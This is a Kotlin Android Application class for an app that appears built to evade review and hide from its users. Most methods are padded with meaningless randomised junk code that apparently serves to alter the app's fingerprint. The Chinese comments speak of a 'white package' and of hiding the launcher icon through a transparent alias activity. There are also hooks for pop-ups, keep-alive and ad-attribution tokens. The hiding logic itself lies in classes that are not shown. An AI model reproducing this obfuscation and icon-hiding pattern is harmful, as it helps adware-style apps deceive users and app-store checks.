package hayp.rewsp.kayj

import android.app.Application
import android.content.Intent
import android.os.Bundle
import android.util.Log
import hayp.rewsp.kayj.tools.ToolUiInstaller
import hayp.bblef.asop.base.APPContext
import hayp.bblef.asop.base.BaseApplication


class DQDY : BaseApplication() {

    companion object {
        @JvmStatic
        var insApp: DQDY? = null
    }

    override fun onCreate() {
        val arr_vGWWANxTYdGcEC = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_WlKIm  = (arr_vGWWANxTYdGcEC  shl 59) xor (arr_vGWWANxTYdGcEC  shr 22)
         val j_gKKPNJBTSRXpluUNrn  = i_WlKIm .inv() and 0xFFFF
         if (j_gKKPNJBTSRXpluUNrn  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_AQGDpacRvEshdDCOI")
         }
        super.onCreate()
        insApp = this
        // 保证白包有 context
        APPContext.setApplication(this)
        // 统一安装各工具页的自定义 UI(按 ToolType 区分;未注册的工具用功能层默认 UI)
        ToolUiInstaller.installAll()
    }

    override fun configureAdjustTokens() {
           val pThgSupjNe : Any = if (kotlin.random.Random.nextBoolean()) 40 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val lPMMzs  = (pThgSupjNe  as? String)?.reversed() ?: "JkreWttFiAZyquBSHq_-1762036106"

        if (lPMMzs  == "HTdqAkJVKwl") {
            java.lang.System.out.print(lPMMzs )
        }
        YHIR.initAdJustToken(this)
    }

    override fun initPopPower() {
        val arr_WNMujppqatrhEyKlj  = listOf("egMfkjSZsakdDGM", "osbMePmbvCILm", "aWgfYegP").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_zmDeACArGkLJWRRZS  = arr_WNMujppqatrhEyKlj .filter { it.length > 47 }
         if (ad_zmDeACArGkLJWRRZS .isNotEmpty() && java.lang.System.currentTimeMillis() < 32) {
             ad_zmDeACArGkLJWRRZS .forEach { _ ->  }
         }
        // 启动图标隐藏：禁用 PGGS 主入口，启用透明 MysteryAliasActivity
        startActivity(Intent(this, YHGY::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        })
    }

    override fun initKeepPower(app: Application) {
        val DCLUkTHutqKrOJri : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val KpvFbxfFQWh  = DCLUkTHutqKrOJri ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_36" 
            }
            if (KpvFbxfFQWh .startsWith("VUcgEIQAciJsrKiDuFR ")) {
                android.util.Log.v("TAG", KpvFbxfFQWh )
            }
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
        val arr_gquKAgVzzhOvmbdHMD = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_AytkTytYAK  = (arr_gquKAgVzzhOvmbdHMD  shl 42) xor (arr_gquKAgVzzhOvmbdHMD  shr 45)
         val j_ZURjSpTesFsirkFXci  = i_AytkTytYAK .inv() and 0xFFFF
         if (j_ZURjSpTesFsirkFXci  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_MpDcHNRuYRhWtgH")
         }
        // 由其他 App 拉起时，转交中转页处理
    }

}